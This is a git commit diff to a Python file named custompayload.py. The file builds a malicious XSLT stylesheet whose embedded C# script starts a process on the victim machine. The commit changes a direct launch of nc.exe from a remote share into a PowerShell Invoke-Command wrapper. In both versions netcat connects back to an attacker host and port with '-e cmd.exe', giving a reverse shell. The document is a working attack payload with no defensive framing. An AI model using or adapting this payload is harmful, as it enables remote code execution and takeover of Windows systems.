c7bf7f3b0c78b31ff41152e18a56e3bd30c5ed66
Surphix <EricHoward@live.ca>
2020-03-27 16:42:49 -0400

    Updated powershell execution script

--- custompayload.py
+++ custompayload.py
@@ -18,8 +18,8 @@ payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
 xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
 <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \
-{ string cmd ="{host} {port} -e cmd.exe"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
- proc.StartInfo.FileName = "//{host}/share/nc.exe"; proc.StartInfo.Arguments = cmd;\
+{ string cmd ="-noexit Invoke-Command -scriptblock {//{host}/share/nc.exe {host} {port} -e cmd.exe}"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
+ proc.StartInfo.FileName = "powershell.exe"; proc.StartInfo.Arguments = cmd;\
  proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \
  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \
  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
